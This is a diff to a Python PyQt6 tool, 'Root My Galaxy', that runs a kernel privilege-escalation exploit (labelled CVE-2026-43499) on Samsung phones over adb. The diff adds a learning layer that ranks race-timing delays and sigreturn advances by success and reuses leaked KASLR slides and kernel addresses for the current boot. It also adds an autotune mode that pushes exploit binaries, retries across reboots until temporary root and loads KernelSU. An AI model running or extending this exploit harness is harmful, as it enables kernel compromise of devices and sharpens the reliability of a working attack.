@@ -4,6 +4,8 @@
 from __future__ import annotations
 
 import os
+import argparse
+import json
 import re
 import shutil
 import subprocess
@@ -24,6 +26,20 @@ from PyQt6.QtWidgets import (
 
 ANSI_ESCAPE = re.compile(r"(?:\x1B|␛)\[[0-?]*[ -/]*[@-~]")
 
+PIPELINE_STAGES = (
+    ("preparing-kernel-access", "06 Preparation"),
+    ("locating-kernel", "07 Kernel location"),
+    ("kernel-location-ready", "07 KASLR resolved"),
+    ("probabilistic-lifetime-race", "08 Lifetime race"),
+    ("verifying-kernel-access", "09 Access verification"),
+    ("kernel-page-ready", "09 Kernel page ready"),
+    ("entering-main-route", "10 Target transition"),
+    ("starting-temporary-root", "11 UMH bootstrap"),
+    ("temporary-root-ready", "12 Temporary root daemon"),
+    ("loading-kernelsu", "15 KernelSU late-load"),
+    ("full-root-ready", "17 Full-root validation"),
+)
+
 
 class RootWindow(QMainWindow):
     def __init__(self) -> None:
@@ -35,6 +51,16 @@ class RootWindow(QMainWindow):
         self.device_uptime_seconds: int | None = None
         self.log_process: QProcess | None = None
         self.selected_serial = ""
+        self.adaptive_state_path = Path(__file__).with_name(
+            ".root-my-galaxy-state.json")
+        self.adaptive_state = self._load_adaptive_state()
+        self.adaptive_build = ""
+        self.adaptive_boot_id = ""
+        self.adaptive_delays = [25000, 20000, 30000, 50000, 15000]
+        self.adaptive_slide = ""
+        self.adaptive_log_lines: list[str] = []
+        self.adaptive_live_status = "Waiting for a test run"
+        self.adaptive_stage_index = -1
         self.quiet_deadline: float | None = None
         self.quiet_duration = 0
         self.log_started = False
@@ -42,7 +68,7 @@ class RootWindow(QMainWindow):
         assets = Path(__file__).with_name("assets")
         jni_libs = assets
         self.helper_path = str(jni_libs / "libcve43499root.so")
-        self.payload_path = str(assets / "cve-2026-43499-app.so")
+        self.payload_path = str(assets / "cve-2026-43499-app-lab-afzg1.so")
         self.ksud_path = str(assets / "ksud-next")
         self.device_name = "No device"
         self.elapsed = QElapsedTimer()
@@ -62,12 +88,261 @@ class RootWindow(QMainWindow):
     def _sh_quote(value: str) -> str:
         return "'" + value.replace("'", "'\"'\"'") + "'"
 
+    def _load_adaptive_state(self) -> dict:
+        try:
+            data = json.loads(self.adaptive_state_path.read_text())
+            return data if isinstance(data, dict) else {"version": 1, "profiles": {}}
+        except (OSError, ValueError):
+            return {"version": 1, "profiles": {}}
+
+    def _save_adaptive_state(self) -> None:
+        temporary = self.adaptive_state_path.with_suffix(".json.tmp")
+        try:
+            temporary.write_text(json.dumps(self.adaptive_state, indent=2, sort_keys=True) + "\n")
+            temporary.replace(self.adaptive_state_path)
+        except OSError:
+            temporary.unlink(missing_ok=True)
+
+    def _prepare_adaptive_profile(self, serial: str) -> None:
+        self.adaptive_log_lines = []
+        try:
+            result = subprocess.run(
+                ["adb", "-s", serial, "shell", "sh", "-c",
+                 "getprop ro.build.display.id; cat /proc/sys/kernel/random/boot_id"],
+                text=True, capture_output=True, timeout=5, check=False,
+            )
+            values = [line.strip() for line in result.stdout.splitlines() if line.strip()]
+        except (OSError, subprocess.TimeoutExpired):
+            values = []
+        self.adaptive_build = values[0] if values else "unknown"
+        self.adaptive_boot_id = values[1] if len(values) > 1 else ""
+
+        profiles = self.adaptive_state.setdefault("profiles", {})
+        profile = profiles.setdefault(self.adaptive_build, {"delays": {}, "boots": {}})
+        defaults = [25000, 20000, 30000, 50000, 15000]
+        delay_stats = profile.setdefault("delays", {})
+        self.adaptive_delays = sorted(
+            defaults,
+            key=lambda delay: (
+                -int(delay_stats.get(str(delay), {}).get("root_success", 0)),
+                -int(delay_stats.get(str(delay), {}).get("scheduler_success", 0)),
+                defaults.index(delay),
+            ),
+        )
+        boot = profile.setdefault("boots", {}).get(self.adaptive_boot_id, {})
+        slide = str(boot.get("slide", ""))
+        self.adaptive_slide = slide if re.fullmatch(r"0x[0-9a-fA-F]+", slide) else ""
+        self.adaptive_live_status = "profile loaded; waiting for a test run"
+        self.adaptive_stage_index = -1
+        self.update_adaptive_dashboard()
+
+    def _learn_from_run(self) -> None:
+        if not self.adaptive_build:
+            return
+        profile = self.adaptive_state.setdefault("profiles", {}).setdefault(
+            self.adaptive_build, {"delays": {}, "boots": {}})
+        delay_stats = profile.setdefault("delays", {})
+        boot = profile.setdefault("boots", {}).setdefault(self.adaptive_boot_id, {})
+        current_delay: int | None = None
+        current_attempt = "unknown"
+        successful_delay: int | None = None
+        addresses: dict[str, str] = {}
+        seen_events: set[tuple[str, str]] = set()
+
+        for line in self.adaptive_log_lines:
+            attempt = re.search(
+                r"exploit attempt=(\d+)/\d+ pid=(\d+) delay=(\d+)", line)
+            if attempt:
+                current_attempt = f"{attempt.group(1)}:{attempt.group(2)}"
+                current_delay = int(attempt.group(3))
+            slide = re.search(r"slide-kaslr-ok .*p0_offset=([0-9a-fA-F]+)", line)
+            if slide:
+                boot["slide"] = f"0x{slide.group(1).lower()}"
+            page = re.search(
+                r"stage=entering-main-route base=([0-9a-fA-F]+) "
+                r"lock=([0-9a-fA-F]+) fops=([0-9a-fA-F]+)", line)
+            if page:
+                addresses = dict(zip(("page", "lock", "fops"), page.groups()))
+            outcome = re.search(
+                r"sigreturn full mode done calls=(\d+) success=(\d+)", line)
+            event_key = (current_attempt, line)
+            if outcome and current_delay is not None and event_key not in seen_events:
+                seen_events.add(event_key)
+                stats = delay_stats.setdefault(str(current_delay), {
+                    "runs": 0, "scheduler_success": 0, "root_success": 0})
+                stats["runs"] = int(stats.get("runs", 0)) + 1
+                if int(outcome.group(2)) > 0:
+                    stats["scheduler_success"] = int(stats.get("scheduler_success", 0)) + 1
+                    successful_delay = current_delay
+            if "stage=temporary-root-ready" in line and successful_delay is not None:
+                stats = delay_stats.setdefault(str(successful_delay), {})
+                stats["root_success"] = int(stats.get("root_success", 0)) + 1
+
+        boot["last_addresses"] = addresses
+        boot["last_delays"] = self.adaptive_delays
+        boot["updated_at"] = int(time.time())
+        # KASLR state from older boots is retained for history, never reused.
+        boots = profile.setdefault("boots", {})
+        if len(boots) > 8:
+            oldest = sorted(boots, key=lambda key: boots[key].get("updated_at", 0))[:-8]
+            for key in oldest:
+                del boots[key]
+        self._save_adaptive_state()
+
+    @staticmethod
+    def _success_rate(successes: int, runs: int) -> str:
+        return f"{(100.0 * successes / runs):.1f}%" if runs else "No data"
+
+    def _adaptive_profile(self) -> dict:
+        profiles = self.adaptive_state.get("profiles", {})
+        if self.adaptive_build and self.adaptive_build in profiles:
+            return profiles[self.adaptive_build]
+        if profiles:
+            return profiles[next(reversed(profiles))]
+        return {"delays": {}, "boots": {}, "strategies": {}}
+
+    def update_adaptive_dashboard(self) -> None:
+        if not hasattr(self, "adaptive_recommendation"):
+            return
+        profile = self._adaptive_profile()
+        delays = profile.get("delays", {})
+        strategies = profile.get("strategies", {})
+
+        total_runs = sum(int(item.get("runs", 0)) for item in delays.values())
+        scheduler_hits = sum(
+            int(item.get("scheduler_success", 0)) for item in delays.values())
+        root_hits = sum(int(item.get("root_success", 0)) for item in delays.values())
+        self.adaptive_rates.setText(
+            f"Scheduler: {scheduler_hits}/{total_runs} "
+            f"({self._success_rate(scheduler_hits, total_runs)})  |  "
+            f"Root: {root_hits}/{total_runs} "
+            f"({self._success_rate(root_hits, total_runs)})"
+        )
+
+        ranked_delays = sorted(
+            ((int(delay), stats) for delay, stats in delays.items()),
+            key=lambda item: (
+                -int(item[1].get("root_success", 0)),
+                -int(item[1].get("scheduler_success", 0)),
+                -self._safe_ratio(item[1].get("scheduler_success", 0),
+                                  item[1].get("runs", 0)),
+                int(item[1].get("runs", 0)),
+            ),
+        )
+        if ranked_delays:
+            delay, stats = ranked_delays[0]
+            runs = int(stats.get("runs", 0))
+            hits = int(stats.get("scheduler_success", 0))
+            recommendation = (
+                f"Continue: {delay} us delay - {hits}/{runs} scheduler hits "
+                f"({self._success_rate(hits, runs)})"
+            )
+        else:
+            recommendation = f"Continue: {self.adaptive_delays[0]} us baseline (untested)"
+
+        ranked_strategies = sorted(
+            strategies.items(),
+            key=lambda item: (
+                -int(item[1].get("root_success", 0)),
+                -int(item[1].get("scheduler_success", 0)),
+                int(item[1].get("crashes", 0)),
+                int(item[1].get("runs", 0)),
+            ),
+        )
+        stable = next((item for item in ranked_strategies
+                       if not int(item[1].get("crashes", 0))), None)
+        if stable:
+            key, stats = stable
+            recommendation += (
+                f"  |  Strategy {key} - "
+                f"{int(stats.get('root_success', 0))}/{int(stats.get('runs', 0))} root hits"
+            )
+        self.adaptive_recommendation.setText(recommendation)
+
+        quarantined = [
+            f"{key} ({int(stats.get('crashes', 0))} disconnects)"
+            for key, stats in ranked_strategies
+            if int(stats.get("crashes", 0)) > 0
+        ]
+        self.adaptive_quarantine.setText(
+            "Discard/quarantine: " + (", ".join(quarantined) if quarantined else "none")
+        )
+        history = []
+        for delay, stats in ranked_delays:
+            runs = int(stats.get("runs", 0))
+            scheduler = int(stats.get("scheduler_success", 0))
+            roots = int(stats.get("root_success", 0))
+            history.append(
+                f"{delay} us: scheduler {scheduler}/{runs}, root {roots}/{runs}"
+            )
+        self.adaptive_history.setText(
+            "Tested candidates: " + (" | ".join(history) if history else "none yet")
+        )
+        self.adaptive_live.setText(f"Current run: {self.adaptive_live_status}")
+        completed = max(0, self.adaptive_stage_index + 1)
+        phase = (PIPELINE_STAGES[self.adaptive_stage_index][1]
+                 if self.adaptive_stage_index >= 0 else "not started")
+        self.adaptive_pipeline.setText(
+            f"Pipeline position: {completed}/{len(PIPELINE_STAGES)} - {phase}"
+        )
+        self.adaptive_stage_progress.setValue(completed)
+
+    @staticmethod
+    def _safe_ratio(numerator: object, denominator: object) -> float:
+        total = int(denominator or 0)
+        return int(numerator or 0) / total if total else 0.0
+
+    def update_adaptive_live_status(self, text: str) -> None:
+        stage = re.search(r"stage=([a-z0-9-]+)", text, re.IGNORECASE)
+        attempt = re.search(r"exploit attempt=(\d+)/(\d+).*delay=(\d+)", text)
+        outcome = re.search(r"sigreturn full mode done calls=(\d+) success=(\d+)", text)
+        if attempt:
+            self.adaptive_live_status = (
+                f"attempt {attempt.group(1)}/{attempt.group(2)}, "
+                f"delay {attempt.group(3)} us"
+            )
+        normalized = text.lower()
+        stage_aliases = {
+            "loading kernelsu": "loading-kernelsu",
+            "kernelsu control verified": "full-root-ready",
+            "full root is active": "full-root-ready",
+        }
+        detected_stage = stage.group(1).lower() if stage else None
+        for marker, alias in stage_aliases.items():
+            if marker in normalized:
+                detected_stage = alias
+        if detected_stage:
+            stage_keys = [key for key, _label in PIPELINE_STAGES]
+            if detected_stage in stage_keys:
+                self.adaptive_stage_index = max(
+                    self.adaptive_stage_index, stage_keys.index(detected_stage))
+            if detected_stage == "loading-kernelsu":
+                self.adaptive_live_status = "temporary root ready; loading KernelSU"
+            elif detected_stage == "full-root-ready":
+                self.adaptive_live_status = "full root independently validated"
+        if stage:
+            self.adaptive_live_status = stage.group(1).replace("-", " ")
+        if outcome:
+            self.adaptive_live_status = (
+                "scheduler primitive succeeded" if int(outcome.group(2)) else
+                "scheduler primitive failed"
+            )
+        if "device" in text.lower() and "not found" in text.lower():
+            self.adaptive_live_status = "device disconnected - strategy should be quarantined"
+        elif "temporary-root-ready" in text:
+            self.adaptive_live_status = "temporary root acquired"
+        elif "failed" in text.lower() or "operation failed" in text.lower():
+            self.adaptive_live_status = "attempt failed; trying the next candidate"
+        self.update_adaptive_dashboard()
+
     def build_root_script(self, serial: str) -> str:
         remote = "/data/local/tmp"
         helper = self._sh_quote(self.helper_path)
         payload = self._sh_quote(self.payload_path)
         ksud = self._sh_quote(self.ksud_path)
         serial_q = self._sh_quote(serial)
+        delay_sequence = ",".join(str(value) for value in self.adaptive_delays)
+        adaptive_slide = self.adaptive_slide
         return f"""
 set -euo pipefail
 SERIAL={serial_q}
@@ -76,6 +351,8 @@ HELPER={helper}
 PAYLOAD={payload}
 KSUD={ksud}
 ADB="adb -s $SERIAL"
+DELAY_SEQUENCE={delay_sequence}
+ADAPTIVE_SLIDE={adaptive_slide}
 
 echo "[*] $($ADB shell getprop ro.build.display.id)"
 echo "[*] Preparing exploit files"
@@ -94,21 +371,22 @@ fi
 
 echo "[*] Running exploit (up to ${{MAX_ATTEMPTS:-5}} attempts; probabilistic)"
 ROOTED=0
-for i in $(seq 1 "${{MAX_ATTEMPTS:-5}}"); do
-    echo "  -> attempt $i/${{MAX_ATTEMPTS:-5}}"
-    $ADB shell "mkdir -p $REMOTE && : > $REMOTE/exploit.log"
-    $ADB shell "EXPLOIT_ATTEMPTS=1 $REMOTE/ksu-helper --run-payload $REMOTE/ksu-payload $REMOTE/ksu-helper $REMOTE/exploit.log" || true
-    if $ADB shell "grep -q 'stage=temporary-root-ready' $REMOTE/exploit.log" 2>/dev/null; then
-        ROOTED=1
-        echo "  [+] Temporary root ready on attempt $i"
-        break
-    fi
-done
+$ADB shell "mkdir -p $REMOTE && : > $REMOTE/exploit.log"
+$ADB shell "EXPLOIT_ATTEMPTS=${{MAX_ATTEMPTS:-5}} EXPLOIT_DELAY_SEQUENCE_USEC=$DELAY_SEQUENCE ${{ADAPTIVE_SLIDE:+SLIDE_P0_OFFSET=$ADAPTIVE_SLIDE}} $REMOTE/ksu-helper --run-payload $REMOTE/ksu-payload $REMOTE/ksu-helper $REMOTE/exploit.log" || true
+if $ADB shell "grep -q 'stage=temporary-root-ready' $REMOTE/exploit.log" 2>/dev/null; then
+    ROOTED=1
+    echo "  [+] Temporary root ready"
+fi
 
 if [ "$ROOTED" -ne 1 ]; then
     echo "[!] Exploit failed after ${{MAX_ATTEMPTS:-5}} attempts. Log:" >&2
     $ADB shell "cat $REMOTE/exploit.log" 2>&1 >&2 || true
     exit 1
+fi
+
+if [[ "$PAYLOAD" == *cve-2026-43499-app-open.so ]]; then
+    echo "[+] Offline payload POC completed; KernelSU late-load skipped"
+    exit 0
 fi
 
 echo "[*] Loading KernelSU through ksud-next late-load"
@@ -206,6 +484,37 @@ fi
         self.kill_system_apps.hide()
         content_layout.addWidget(options)
 
+        intelligence = QGroupBox("Adaptive intelligence")
+        intelligence_layout = QVBoxLayout(intelligence)
+        intelligence_layout.setSpacing(5)
+        self.adaptive_recommendation = QLabel()
+        self.adaptive_recommendation.setObjectName("adaptiveRecommendation")
+        self.adaptive_rates = QLabel()
+        self.adaptive_rates.setObjectName("adaptiveRates")
+        self.adaptive_live = QLabel()
+        self.adaptive_live.setObjectName("adaptiveLive")
+        self.adaptive_pipeline = QLabel()
+        self.adaptive_pipeline.setObjectName("adaptivePipeline")
+        self.adaptive_stage_progress = QProgressBar()
+        self.adaptive_stage_progress.setRange(0, len(PIPELINE_STAGES))
+        self.adaptive_stage_progress.setTextVisible(False)
+        self.adaptive_stage_progress.setMaximumHeight(7)
+        self.adaptive_history = QLabel()
+        self.adaptive_history.setObjectName("adaptiveHistory")
+        self.adaptive_quarantine = QLabel()
+        self.adaptive_quarantine.setObjectName("adaptiveQuarantine")
+        for label in (
+                self.adaptive_recommendation, self.adaptive_rates,
+                self.adaptive_live, self.adaptive_pipeline,
+                self.adaptive_history,
+                self.adaptive_quarantine):
+            label.setWordWrap(True)
+            intelligence_layout.addWidget(label)
+            if label is self.adaptive_pipeline:
+                intelligence_layout.addWidget(self.adaptive_stage_progress)
+        content_layout.addWidget(intelligence)
+        self.update_adaptive_dashboard()
+
         self.output = QTextEdit()
         self.output.setObjectName("terminalOutput")
         self.output.setReadOnly(True)
@@ -259,6 +568,12 @@ fi
             #title { font-size: 24px; font-weight: 600; }
             #subtitle { color: #4b5563; margin-left: 8px; }
             #activeTime { color: palette(mid); font-family: monospace; }
+            #adaptiveRecommendation { color: #15803d; font-weight: 700; }
+            #adaptiveRates { color: palette(text); font-weight: 600; }
+            #adaptiveLive { color: #2563eb; }
+            #adaptivePipeline { color: palette(text); font-weight: 600; }
+            #adaptiveHistory { color: palette(mid); }
+            #adaptiveQuarantine { color: #b91c1c; }
             QGroupBox {
                 font-weight: 600;
                 border: 1px solid palette(mid);
@@ -500,6 +815,7 @@ fi
         self.root_active = False
         self.title_label.setText("Root My Galaxy")
         self.selected_serial = str(serial)
+        self._prepare_adaptive_profile(self.selected_serial)
         self.log_started = False
         self.append_output("Preparing a clean remote run…")
         self.append_output("[GUI] Keeping the device screen awake during the exploit…")
@@ -690,6 +1006,9 @@ fi
         # Helpers may emit ANSI colours; they become visible as broken escape
         # characters in a text widget, so strip them before rendering.
         text = ANSI_ESCAPE.sub("", text).replace("\r", "")
+        if text.strip():
+            self.adaptive_log_lines.append(text.strip())
+            self.update_adaptive_live_status(text.strip())
         hidden_lines = (
             "$ python-root-flow",
             "[*] Device:",
@@ -826,6 +1145,8 @@ fi
     def finished(self, exit_code: int, _exit_status: QProcess.ExitStatus) -> None:
         self.read_stdout()
         self.read_stderr()
+        self._learn_from_run()
+        self.update_adaptive_dashboard()
         self.update_active_time()
         self.run_timer.stop()
         self.quiet_deadline = None
@@ -864,8 +1185,164 @@ fi
         event.accept()
 
 
+def run_autotune(serial: str, cycles: int, allow_reboot: bool) -> int:
+    base = Path(__file__).resolve().parent
+    assets = base / "assets"
+    state_path = base / ".root-my-galaxy-state.json"
+    try:
+        state = json.loads(state_path.read_text())
+    except (OSError, ValueError):
+        state = {"version": 1, "profiles": {}}
+
+    def adb(*arguments: str, timeout: int = 30) -> subprocess.CompletedProcess[str]:
+        return subprocess.run(
+            ["adb", "-s", serial, *arguments], text=True,
+            capture_output=True, timeout=timeout, check=False,
+        )
+
+    def wait_for_boot() -> tuple[str, str]:
+        subprocess.run(["adb", "-s", serial, "wait-for-device"],
+                       timeout=120, check=False)
+        result = adb(
+            "shell", "sh", "-c",
+            "while [ \"$(getprop sys.boot_completed)\" != 1 ]; do sleep 1; done; "
+            "getprop ro.build.display.id; cat /proc/sys/kernel/random/boot_id",
+            timeout=180,
+        )
+        values = [line.strip() for line in result.stdout.splitlines() if line.strip()]
+        return (values[0] if values else "unknown",
+                values[1] if len(values) > 1 else "")
+
+    if cycles > 1 and not allow_reboot:
+        print("[!] Multiple clean autotune cycles require --allow-reboot.")
+        return 2
+
+    defaults = [25000, 15000, 20000, 30000, 50000]
+    advances = [0, 1, 2, 3]
+    build, boot_id = wait_for_boot()
+    profiles = state.setdefault("profiles", {})
+    profile = profiles.setdefault(build, {"delays": {}, "boots": {}, "strategies": {}})
+    strategies = profile.setdefault("strategies", {})
+
+    def strategy_score(item: tuple[int, int]) -> tuple[int, int, int, int]:
+        delay, advance = item
+        stats = strategies.get(f"{delay}:{advance}", {})
+        delay_history = profile.setdefault("delays", {}).get(str(delay), {})
+        return (
+            -int(stats.get("root_success", 0)) - int(delay_history.get("root_success", 0)),
+            -int(stats.get("scheduler_success", 0)) - int(delay_history.get("scheduler_success", 0)),
+            int(stats.get("crashes", 0)),
+            int(stats.get("runs", 0)),
+        )
+
+    candidates = [(delay, advance) for delay in defaults for advance in advances]
+    attempted: set[tuple[int, int]] = set()
+
+    for cycle in range(cycles):
+        if cycle and allow_reboot:
+            print(f"[*] Rebooting before clean cycle {cycle + 1}/{cycles}")
+            adb("reboot")
+            build, boot_id = wait_for_boot()
+
+        available = [candidate for candidate in candidates if candidate not in attempted]
+        delay, advance = sorted(available or candidates, key=strategy_score)[0]
+        attempted.add((delay, advance))
+        key = f"{delay}:{advance}"
+        stats = strategies.setdefault(key, {
+            "runs": 0, "scheduler_success": 0,
+            "root_success": 0, "crashes": 0,
+        })
+        boot = profile.setdefault("boots", {}).setdefault(boot_id, {})
+        slide = str(boot.get("slide", ""))
+        slide_env = f" SLIDE_P0_OFFSET={slide}" if re.fullmatch(
+            r"0x[0-9a-fA-F]+", slide) else ""
+
+        print(f"[*] Cycle {cycle + 1}/{cycles}: delay={delay} advance={advance}")
+        for source, remote in (
+            (assets / "libcve43499root.so", "/data/local/tmp/ksu-helper"),
+            (assets / "cve-2026-43499-app-lab-afzg1.so", "/data/local/tmp/ksu-payload"),
+            (assets / "ksud-next", "/data/local/tmp/ksud-selected"),
+        ):
+            pushed = adb("push", str(source), remote, timeout=60)
+            if pushed.returncode:
+                print(pushed.stderr.strip())
+                return 1
+        adb("shell", "chmod", "0755", "/data/local/tmp/ksu-helper",
+            "/data/local/tmp/ksu-payload", "/data/local/tmp/ksud-selected")
+
+        command = (
+            ": > /data/local/tmp/exploit.log; "
+            f"EXPLOIT_ATTEMPTS=1 EXPLOIT_DELAY_SEQUENCE_USEC={delay} "
+            f"SIGRETURN_ADVANCE={advance}{slide_env} "
+            "/data/local/tmp/ksu-helper --run-payload "
+            "/data/local/tmp/ksu-payload /data/local/tmp/ksu-helper "
+            "/data/local/tmp/exploit.log"
+        )
+        try:
+            result = adb("shell", "sh", "-c", command, timeout=240)
+            log = adb("shell", "cat", "/data/local/tmp/exploit.log",
+                      timeout=10).stdout
+        except subprocess.TimeoutExpired:
+            result = None
+            log = ""
+        if log:
+            print(log, end="" if log.endswith("\n") else "\n")
+
+        stats["runs"] = int(stats.get("runs", 0)) + 1
+        scheduler_ok = bool(re.search(
+            r"sigreturn full mode done calls=\d+ success=[1-9]", log))
+        rooted = "stage=temporary-root-ready" in log
+        if scheduler_ok:
+            stats["scheduler_success"] = int(stats.get("scheduler_success", 0)) + 1
+        if rooted:
+            stats["root_success"] = int(stats.get("root_success", 0)) + 1
+
+        slide_match = re.search(r"slide-kaslr-ok .*p0_offset=([0-9a-fA-F]+)", log)
+        if slide_match:
+            boot["slide"] = f"0x{slide_match.group(1).lower()}"
+        route = re.search(
+            r"stage=entering-main-route base=([0-9a-fA-F]+) "
+            r"lock=([0-9a-fA-F]+) fops=([0-9a-fA-F]+)", log)
+        boot["last_addresses"] = dict(zip(
+            ("page", "lock", "fops"), route.groups())) if route else {}
+        boot["updated_at"] = int(time.time())
+
+        device_online = adb("get-state", timeout=10).stdout.strip() == "device"
+        if not device_online:
+            stats["crashes"] = int(stats.get("crashes", 0)) + 1
+            print(f"[!] Strategy {key} disconnected the device; quarantined.")
+
+        state_path.write_text(json.dumps(state, indent=2, sort_keys=True) + "\n")
+        if rooted:
+            late = adb(
+                "shell", "sh", "-c",
+                "S25U_KSUD_PATH=/data/local/tmp/ksud-selected "
+                "/data/local/tmp/ksu-helper --late-load", timeout=60)
+            print(late.stdout, end="")
+            print(f"[+] Root strategy selected: delay={delay} advance={advance}")
+            return 0
+        if not device_online and not allow_reboot:
+            return 1
+        time.sleep(5)
+
+    print("[!] Autotune finished without full root; learned state was preserved.")
+    return 1
+
+
 def main() -> int:
-    app = QApplication(sys.argv)
+    parser = argparse.ArgumentParser(add_help=False)
+    parser.add_argument("--autotune", action="store_true")
+    parser.add_argument("--serial")
+    parser.add_argument("--cycles", type=int, default=10)
+    parser.add_argument("--allow-reboot", action="store_true")
+    args, qt_args = parser.parse_known_args()
+    if args.autotune:
+        if not args.serial:
+            print("[!] --serial is required for autotune.")
+            return 2
+        return run_autotune(args.serial, max(1, args.cycles), args.allow_reboot)
+
+    app = QApplication([sys.argv[0], *qt_args])
     app.setApplicationName("Standalone Exploit Root GUI")
     if "Breeze" in QStyleFactory.keys():
         app.setStyle(QStyleFactory.create("Breeze"))
